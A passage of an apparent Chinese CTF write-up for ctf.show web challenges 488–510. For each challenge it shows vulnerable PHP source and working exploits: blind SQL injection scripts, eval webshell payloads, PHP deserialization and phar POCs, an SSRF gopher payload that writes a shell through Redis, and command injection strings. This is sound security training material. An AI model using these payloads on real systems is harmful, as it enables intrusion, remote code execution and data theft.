+            'username': f&quot;999')||{payload}#&quot;,
+            'password': &quot;123&quot;
+        }
+        r = requests.get(url,params=data,proxies=proxy)
+        if &quot;admin&quot; in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web488">web488</h2>
+<p>分析下源码<br>
+render_class.php</p>
+<pre><code class="language-php">
+&lt;?php
+
+include('file_class.php');
+include('cache_class.php');
+
+class templateUtil {
+	public static function render($template,$arg=array()){
+		if(cache::cache_exists($template)){
+			echo cache::get_cache($template);
+		}else{
+			$templateContent=fileUtil::read('templates/'.$template.'.php');
+			$cache=templateUtil::shade($templateContent,$arg);
+			cache::create_cache($template,$cache);
+			echo $cache;
+		}
+	}
+	public static  function shade($templateContent,$arg){
+		foreach ($arg as $key =&gt; $value) {
+			$templateContent=str_replace('{{'.$key.'}}', $value, $templateContent);
+		}
+		return $templateContent;
+	}
+
+}
+</code></pre>
+<p>cache_class.php</p>
+<pre><code class="language-php">&lt;?php
+
+class cache{
+	public static function create_cache($template,$content){
+		if(file_exists('cache/'.md5($template).'.php')){
+			return true;
+		}else{
+			fileUtil::write('cache/'.md5($template).'.php',$content);
+		}
+	}
+	public static function get_cache($template){
+		return fileUtil::read('cache/'.md5($template).'.php');
+	}
+	public static function cache_exists($template){
+		return file_exists('cache/'.md5($template).'.php');
+	}
+
+}
+</code></pre>
+<p>在缓存文件功能处，存在任意写文件。</p>
+<p>可以控制md5(error).php的内容，在username处写入内容。</p>
+<pre><code>?action=check&amp;username=&lt;?php eval($_POST[1]);?&gt;&amp;password=123
+</code></pre>
+<p>访问<code>/cache/cb5e100e5a9a3e7f6d1fd97512215282.php</code>连接shell</p>
+<h2 id="web489">web489</h2>
+<p>使用extract函数进行变量覆盖<br>
+index.php</p>
+<pre><code class="language-php">&lt;?php
+include('render/render_class.php');
+include('render/db_class.php');
+
+
+
+$action=$_GET['action'];
+if(!isset($action)){
+	header('location:index.php?action=login');
+	die();	
+}
+
+if($action=='check'){
+	$sql = &quot;select id from user where username = '&quot;.md5($username).&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+	extract($_GET);
+	$user=db::select_one($sql);
+	if($user){
+		templateUtil::render('index',array('username'=&gt;$username));
+	}else{
+		templateUtil::render('error');
+	}
+}
+
+if($action=='clear'){
+	system('rm -rf cache/*');
+	die('cache clear');
+}
+
+if($action=='login'){
+	templateUtil::render($action);
+}else{
+	templateUtil::render($action);
+}
+</code></pre>
+<p>直接覆盖sql语句来写shell,但是没有写权限<br>
+还是只能盲注</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://ef0b4c73-1742-4596-951a-f359520c8d19.challenge.ctf.show/index.php?action=check&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    'http':&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        payload = f&quot;if(ascii(substr((select load_file('/flag')),{i},1))&gt;'{mid}',sleep(0.6),1)&quot;
+        data = {
+            'sql': f&quot;select {payload}&quot;
+        }
+        try:
+            r = requests.get(url,params=data,proxies=proxy, timeout=0.5)
+            tail = mid
+        except:
+            head = mid + 1
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web490">web490</h2>
+<p>index.php</p>
+<pre><code class="language-php">&lt;?php
+
+include('render/render_class.php');
+include('render/db_class.php');
+
+
+$action=$_GET['action'];
+if(!isset($action)){
+	header('location:index.php?action=login');
+	die();	
+}
+
+if($action=='check'){
+	extract($_GET);
+	$sql = &quot;select username from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+	$user=db::select_one($sql);
+	if($user){
+		templateUtil::render('index',array('username'=&gt;$user-&gt;username));
+	}else{
+		templateUtil::render('error');
+	}
+}
+if($action=='clear'){
+	system('rm -rf cache/*');
+	die('cache clear');
+}
+
+if($action=='login'){
+	templateUtil::render($action);
+}else{
+	templateUtil::render($action);
+}
+</code></pre>
+<p>username处存在sql注入。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://34dbfb2d-2b7b-4ffc-9f66-c4f653c2116f.challenge.ctf.show//index.php?action=check&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    'http':&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        payload = f&quot;if(ascii(substr((select load_file('/flag')),{i},1))&gt;'{mid}',1,0)&quot;
+        data = {
+            'username': f&quot;admin' or {payload}#&quot;,
+            'password': &quot;123&quot;,
+
+        }
+        r = requests.get(url=url, params=data,proxies=proxy)
+        if '不存在' not in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web491">web491</h2>
+<p>同上</p>
+<h2 id="web492">web492</h2>
+<p>对username做了正则匹配，只能为字母数字。</p>
+<pre><code class="language-php">&lt;?php
+
+if($action=='check'){
+	extract($_GET);
+	if(preg_match('/^[A-Za-z0-9]+$/', $username)){
+		$sql = &quot;select username from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+		$user=db::select_one_array($sql);
+	}
+	if($user){
+		templateUtil::render('index',$user);
+	}else{
+		templateUtil::render('error');
+	}
+}
+</code></pre>
+<p>render/render_class.php</p>
+<pre><code class="language-php">&lt;?php
+
+include('file_class.php');
+include('cache_class.php');
+
+class templateUtil {
+	public static function render($template,$arg=array()){
+		if(cache::cache_exists($template)){
+			echo cache::get_cache($template);
+		}else{
+			$templateContent=fileUtil::read('templates/'.$template.'.php');
+			$cache=templateUtil::shade($templateContent,$arg);
+			cache::create_cache($template,$cache);
+			echo $cache;
+		}
+	}
+	public static  function shade($templateContent,$arg){
+		foreach ($arg as $key =&gt; $value) {
+			$templateContent=str_replace('{{'.$key.'}}', '&lt;！--'.$value.'--&gt;', $templateContent);
+		}
+		return $templateContent;
+	}
+}
+</code></pre>
+<p>先使用变量覆盖，控制<code>$user</code>的值，再利用创建缓存文件来写入。</p>
+<pre><code>?action=check&amp;user[username]=--&gt;&lt;?php%20@eval($_POST[1]);?&gt;
+</code></pre>
+<p>访问<code>/cache/6a992d5529f459a44fee58c733255e86.php</code><br>
+连接shell即可。</p>
+<h2 id="web493">web493</h2>
+<p>存在反序列化入口。<br>
+index.php</p>
+<pre><code class="language-php">&lt;?php
+$action=$_GET['action'];
+if(!isset($action)){
+	if(isset($_COOKIE['user'])){
+		$c=$_COOKIE['user'];
+		$user=unserialize($c);
+		if($user){
+			templateUtil::render('index');
+		}else{
+			header('location:index.php?action=login');
+		}
+	}else{
+		header('location:index.php?action=login');
+	}
+	die();	
+}
+</code></pre>
+<p>找可以利用的destruct函数。<br>
+db_class.php</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+class db{
+	
+	public $db;
+	public $log;
+	public $sql;
+	public $username='root';
+	public $password='root';
+	public $port='3306';
+	public $addr='127.0.0.1';
+	public $database='ctfshow';
+	public function __construct(){
+		$this-&gt;log=new dbLog();
+		$this-&gt;db=$this-&gt;getConnection();
+	}
+
+	public function getConnection(){
+		 
+		return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);
+	}
+
+	public  function select_one($sql){
+		$this-&gt;sql=$sql;
+		$conn = db::getConnection();
+		$result=$conn-&gt;query($sql);
+		if($result){
+			return $result-&gt;fetch_object();
+		}
+
+	}
+	public  function select_one_array($sql){
+		$this-&gt;sql=$sql;
+		$conn = db::getConnection();
+		$result=$conn-&gt;query($sql);
+		if($result){
+			return $result-&gt;fetch_assoc();
+		}
+
+	}
+	public function __destruct(){
+		$this-&gt;log-&gt;log($this-&gt;sql);
+	}
+}
+class dbLog{
+	public $sql;
+	public $content;
+	public $log;
+
+	public function __construct(){
+		$this-&gt;log='log/'.date_format(date_create(),&quot;Y-m-d&quot;).'.txt';
+	}
+	public function log($sql){
+		$this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).' '.$sql.' \r\n';
+	}
+	public function __destruct(){
+		file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
+	}
+}
+</code></pre>
+<p>poc</p>
+<pre><code class="language-php">&lt;?php
+
+class dbLog{
+public $sql;
+public $content;
+public $log;
+
+public function __construct(){
+$this-&gt;log='/var/www/html/1.php';
+$this-&gt;sql=&quot;&quot;;
+$this-&gt;content=&quot;&lt;?php @eval(\$_POST[1])?&gt;&quot;;
+}
+public function log($sql){
+$this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).' '.$sql.' \r\n';
+}
+public function __destruct(){
+file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
+}
+}
+
+echo serialize(new dbLog());
+</code></pre>
+<p>url编码一下</p>
+<pre><code>Cookie: user=%4f%3a%35%3a%22%64%62%4c%6f%67%22%3a%33%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%73%3a%30%3a%22%22%3b%73%3a%37%3a%22%63%6f%6e%74%65%6e%74%22%3b%73%3a%32%34%3a%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%22%3b%73%3a%33%3a%22%6c%6f%67%22%3b%73%3a%31%39%3a%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%7d;
+</code></pre>
+<h2 id="web494">web494</h2>
+<p>预期应该是sql注入绕过，但用上题payload的反序列化依然可以。<br>
+flag再数据库中。</p>
+<pre><code class="language-php">&lt;?php
+$action=$_GET['action'];
+if(!isset($action)){
+	if(isset($_COOKIE['user'])){
+		$c=$_COOKIE['user'];
+		if(preg_match('/\:|\,/', $c)){
+			$user=unserialize($c);
+		}
+		if($user){
+			templateUtil::render('index');
+		}else{
+			header('location:index.php?action=login');
+		}
+	}else{
+		header('location:index.php?action=login');
+	}
+	die();	
+}
+
+if($action=='check'){
+	extract($_GET);
+	if(!preg_match('/or|and|innodb|sys/i', $username)){
+		$sql = &quot;select username from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+		$db=new db();
+		$user=$db-&gt;select_one_array($sql);
+	}
+	if($user){
+		setcookie('user',$user);
+		templateUtil::render('index',$user);
+	}else{
+		templateUtil::render('error');
+	}
+}
+</code></pre>
+<h2 id="web495">web495</h2>
+<p>同上</p>
+<pre><code class="language-php">&lt;?php
+$username=$_POST['username'];
+		$password=$_POST['password'];
+		if(!preg_match('/file|innodb|sys|mysql/i', $username)){
+			$sql = &quot;select username,nickname from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+			$db=new db();
+			$user=$db-&gt;select_one_array($sql);
+		}
+</code></pre>
+<h2 id="web496">web496</h2>
+<p>反序列化入口被注释掉了，只能sql注入了</p>
+<pre><code class="language-php">&lt;?php
+$username=$_POST['username'];
+		$password=$_POST['password'];
+		if(!preg_match('/or|file|innodb|sys|mysql/i', $username)){
+			$sql = &quot;select username,nickname from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+			$db=new db();
+			$user=$db-&gt;select_one_array($sql);
+		}
+</code></pre>
+<p>但是这里因为过滤了总表，没法查询表名和列名。（在知道的情况下可以注入）</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://b078dfb1-17d3-4a27-bd57-c72019b486da.challenge.ctf.show/index.php?action=check&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    'http':&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    #print(i)
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        #print(&quot;mid&quot;,mid)
+        payload = f&quot;if(ascii(substr((select  flagisherebutyouneverknow118 from flagyoudontknow76),{i},1))&gt;'{mid}',1,0)&quot;
+        data = {
+            'username': f&quot;123' || {payload}#&quot;,
+            'password': &quot;123&quot;,
+
+        }
+        r = requests.post(url=url, data=data,proxies=proxy,allow_redirects=False)
+        #print(r.status_code)
+        if 302 == r.status_code:
+            head = mid + 1
+            #print(&quot;in the right&quot;)
+        else:
+            tail = mid
+            #print(&quot;in the left&quot;)
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<p>使用万能账号登录进后台后，有一个更新密码功能。<br>
+admin_edit.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+include('../render/db_class.php');
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+	extract($_POST);
+	$sql = &quot;update user set nickname='&quot;.substr($nickname, 0,8).&quot;' where username='&quot;.$user['username'].&quot;'&quot;;
+	$db=new db();
+	if($db-&gt;update_one($sql)){
+		$_SESSION['user']['nickname']=$nickname;
+		$ret['msg']='管理员信息修改成功';
+	}else{
+		$ret['msg']='管理员信息修改失败';
+	}
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>这里没有过滤，存在update型注入</p>
+<pre><code class="language-py">import requests
+import string
+url=&quot;http://b078dfb1-17d3-4a27-bd57-c72019b486da.challenge.ctf.show&quot;
+s=string.ascii_lowercase+string.digits+&quot;,{-}&quot;
+sess=requests.session()
+sess.post(url+&quot;?action=check&quot;,data={&quot;username&quot;:&quot;1'||1#&quot;,&quot;password&quot;:1})
+flag=&quot;&quot;
+for i in range(9,70):
+        print(i)
+        for j in s:
+            data={
+            'nickname':str(i*2)+str(j), #不让nickname重复就行
+            #'user[username]':&quot;1'||if(ascii(substr((select  group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1},1,0)#&quot;.format(i,j)
+            #'user[username]':&quot;1'||if(substr((select  group_concat(column_name) from information_schema.columns where table_name='flagyoudontknow76'),{0},1)='{1}',1,0)#&quot;.format(i,j)
+            'user[username]':&quot;1'||if(substr((select  flagisherebutyouneverknow118 from flagyoudontknow76),{0},1)='{1}',1,0)#&quot;.format(i,j)
+
+            }
+            r=sess.post(url+&quot;/api/admin_edit.php&quot;,data=data)
+            if(&quot;u529f&quot; in r.text):
+                flag+=j
+                print(flag)
+                break
+</code></pre>
+<h2 id="web497">web497</h2>
+<p>使用万能账号登录后台<br>
+上传图片处存在ssrf漏洞。</p>
+<p>render_class.php</p>
+<pre><code class="language-php">&lt;?php
+public static function checkImage($templateContent,$arg=array()){
+		foreach ($arg as $key =&gt; $value) {
+
+			if(stripos($templateContent, '{{img:'.$key.'}}')){
+				$encode='';
+				if(file_exists(__DIR__.'/../cache/'.md5($value))){
+					$encode=file_get_contents(__DIR__.'/../cache/'.md5($value));
+				}else{
+					$ch=curl_init($value);
+					curl_setopt($ch, CURLOPT_HEADER, 0);
+					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+					$result=curl_exec($ch);
+					curl_close($ch);
+					$ret=chunk_split(base64_encode($result));
+					$encode = 'data:image/jpg/png/gif;base64,' . $ret;
+					file_put_contents(__DIR__.'/../cache/'.md5($value), $encode);
+				}
+				$templateContent=str_replace('{{img:'.$key.'}}', $encode, $templateContent);
+			}
+			
+		}
+</code></pre>
+<p>payload</p>
+<pre><code>file:///flag
+</code></pre>
+<h2 id="web498">web498</h2>
+<p>同上存在ssrf，但是需要用ssrf打redis<br>
+使用poc</p>
+<pre><code>dict://127.0.0.1:6379
+</code></pre>
+<p>根据返回值发现存在redis服务<br>
+使用Gopherus生成payload</p>
+<pre><code>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
+</code></pre>
+<p>连接shell.php，flag在根目录。</p>
+<h2 id="web499">web499</h2>
+<p>登录后台，系统配置功能处，能修改配置信息。</p>
+<p>注入php代码进<code>/config/settings.php</code></p>
+<h2 id="web500">web500</h2>
+<p>修改了配置文件的后缀，无法解析了。</p>
+<p>admin_settings.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+	$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+	foreach ($_POST as $key =&gt; $value) {
+		$config[$key]=$value;
+	}
+	file_put_contents(__DIR__.'/../config/settings', serialize($config));
+	$ret['msg']='管理员信息修改成功';
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>查看数据管理的数据库备份功能处<br>
+/api/admin_db_backup</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+	extract($_POST);
+	shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.__DIR__.'/../backup/'.$db_path);
+
+
+	if(file_exists(__DIR__.'/../backup/'.$db_path)){
+		$ret['msg']='数据库备份成功';
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>这里存在命令注入</p>
+<pre><code>db.zip&amp;&amp;cat /flag_bei_ni_fa_xian_le &gt;1.txt
+</code></pre>
+<h2 id="web501">web501</h2>
+<p>命令注入处添加了正则匹配，还是可以注入。</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+	extract($_POST);
+
+	if(preg_match('/^zip|tar|sql$/', $db_format)){
+		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format);
+		if(file_exists(__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format)){
+			$ret['msg']='数据库备份成功';
+		}else{
+			$ret['msg']='数据库备份失败';
+		}
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>payload</p>
+<pre><code>db_format=zip;cat /flag_bei_ni_fa_xian_le &gt;1.txt
+</code></pre>
+<h2 id="web502">web502</h2>
+<p>系統配置功能处存在文件上传，且只有前台校验文件类型。</p>
+<p>api/admin_upload.php</p>
+<pre><code class="language-php">&lt;?php
+$arr = $_FILES[&quot;file&quot;];
+	if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )
+	{
+		$arr[&quot;tmp_name&quot;];
+		$filename = md5($arr['name']);
+		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
+		if(!preg_match('/^php$/i', $ext)){
+			$basename = &quot;../img/&quot;.$filename.'.' . $ext;
+			move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$config['logo']=$filename.'.' . $ext;
+			file_put_contents(__DIR__.'/../config/settings', serialize($config));
+			$ret['msg']='文件上传成功';
+		}
+		
+	}else{
+		$ret['msg']='文件上传失败';
+	}
+	
+	die(json_encode($ret));
+</code></pre>
+<p>后台会校验，不让后缀为php，考虑用其他后缀来绕过，单发现都不解析。。。</p>
+<p>上传文件路径为<code>/img/md5(&quot;filename&quot;).phtml</code><br>
+也可以在<code>config/settings</code>中看到路径</p>
+<p>发现之前的命令注入处依然可以利用<br>
+api/admin_db_backup.php</p>
+<pre><code class="language-php">&lt;?php
+session_start();
+
+include('../render/db_class.php');
+error_reporting(0);
+$user= $_SESSION['user'];
+$pre=__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'/db.';
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+	extract($_POST);
+	if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+			die(json_encode($ret));
+	}
+
+	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
+		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.$pre.$db_format);
+		if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+		}else{
+			$ret['msg']='数据库备份失败';
+		}
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>正则添加括号后，无法再绕过了，但是多了一个pre参数可以利用。</p>
+<pre><code>db_format=zip&amp;pre=1;cat /flag_bei_ni_fa_xian_le &gt; /var/www/html/1.txt;echo
+</code></pre>
+<h2 id="web503">web503</h2>
+<p>api/admin_db_backup.php</p>
+<pre><code class="language-php">&lt;?php
+extract($_POST);
+	if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+			die(json_encode($ret));
+	}
+
+	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
+		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.md5($pre.$db_format));
+		if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+		}else{
+			$ret['msg']='数据库备份失败';
+		}
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	die(json_encode($ret));
+</code></pre>
+<p>这里使用md5的方式，无法进行注入了。<br>
+存在file_exists函数，并且网站logo处存在任意文件上传。<br>
+可以考虑使用phar://反序列化。参考文章<a href="https://xz.aliyun.com/t/6699">php反序列化拓展攻击详解--phar</a></p>
+<p>生成phar包</p>
+<pre><code class="language-php">&lt;?php
+class dbLog{
+    public $sql;
+    public $content=&quot;&lt;?php @eval(\$_POST[1])?&gt;&quot;;
+    public $log=&quot;/var/www/html/1.php&quot;;
+}
+
+$c=new dbLog();
+
+$phar = new Phar(&quot;ctfshow.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+$phar-&gt;setMetadata($c); //将自定义meta-data存入manifest
+$phar-&gt;addFromString(&quot;a&quot;, &quot;a&quot;); //添加要压缩的文件
+$phar-&gt;stopBuffering();
+
+?&gt;
+</code></pre>
+<p>修改名为png上传<br>
+<img src="https://fallingskies22.github.io/post-images/1723285773930.png" alt="" loading="lazy"></p>
+<p>再数据库备份功能处，触发发序列化<br>
+<img src="https://fallingskies22.github.io/post-images/1723285800542.png" alt="" loading="lazy"></p>
+<p>访问shell即可获得flag。</p>
+<h2 id="web504">web504</h2>
+<p>增加了模板管理功能。<br>
+在新增模板功能处存在任意文件上传，且存在目录穿越。<br>
+利用<code>/api/admin_settings.php</code>中的/config/settings来触发反序列化。</p>
+<p>上传文件</p>
+<pre><code>name=../config/settings&amp;content=%4f%3a%35%3a%22%64%62%4c%6f%67%22%3a%33%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%73%3a%30%3a%22%22%3b%73%3a%37%3a%22%63%6f%6e%74%65%6e%74%22%3b%73%3a%32%34%3a%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%22%3b%73%3a%33%3a%22%6c%6f%67%22%3b%73%3a%31%39%3a%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%7d;
+</code></pre>
+<p>访问/api/admin_settings.php<br>
+连接1.php</p>
+<h2 id="web505">web505</h2>
+<p>增加了一个文件查看功能，用来看源码。<br>
+api/admin_file_view.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+
+	extract($_POST);
+	if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
+		include($f);
+	}else{
+		$ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
+	}
+	$ret['msg']='查看成功';
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>这里存在一个文件包含</p>
+<p>上传文件后</p>
+<pre><code>f=/var/www/html/img/4a47a0db6e60853dedfcfdf08a5ca249.png&amp;debug=1&amp;1=system('cat /flag_is_here_aabbcc');
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1723367239702.png" alt="" loading="lazy"></figure>
+<h2 id="web506">web506</h2>
+<p>api/admin_file_view.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+
+	extract($_POST);
+	$ext = substr($f, strlen($f)-3,3);
+	if(preg_match('/php|sml|phar/i', $ext)){
+		$ret['msg']='请不要使用此功能';
+		die(json_encode($ret));
+	}
+	if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
+		include($f);
+	}else{
+		$ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
+	}
+	$ret['msg']='查看成功';
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>增加了限制，文件名后缀不能为php,sml,phar</p>
+<p>用上题方法依然可以</p>
+<h2 id="web507">web507</h2>
+<h2 id="web508">web508</h2>
+<p>同上</p>
+<h2 id="web509">web509</h2>
+<p>api/admin_file_view.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+
+	extract($_POST);
+	if(preg_match('/php|sml|phar|\:|data|file/i', $f)){
+		$ret['msg']='请不要使用此功能';
+		die(json_encode($ret));
+	}
+	if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
+		include($f);
+	}else{
+		$ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
+	}
+	$ret['msg']='查看成功';
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>又增加了一些过滤，但还是可以利用。</p>
+<p>文件上传处，对内容也做了过滤<br>
+api/admin_upload.php</p>
+<pre><code class="language-php">&lt;?php
+$arr = $_FILES[&quot;file&quot;];
+	if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )
+	{
+		$arr[&quot;tmp_name&quot;];
+		$filename = md5($arr['name']);
+		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
+		if(!preg_match('/^php$/i', $ext)){
+			if(preg_match('/php|sml|phar|\:|data|file/i', file_get_contents($arr[&quot;tmp_name&quot;]))){
+                	$ret['msg']='请不要使用此功能';
+                	die(json_encode($ret));
+        		}
+
+			$basename = &quot;../img/&quot;.$filename.'.' . $ext;
+			move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$config['logo']=$filename.'.' . $ext;
+			file_put_contents(__DIR__.'/../config/settings', serialize($config));
+			$ret['msg']='文件上传成功';
+		}
+		
+	}else{
+		$ret['msg']='文件上传失败';
+	}
+</code></pre>
+<p>使用短标签，绕过<code>php</code>关键字</p>
+<pre><code class="language-php">user&lt;?= @eval($_POST[1]);?&gt;
+</code></pre>
+<h2 id="web510">web510</h2>
+<p>api/admin_upload.php</p>
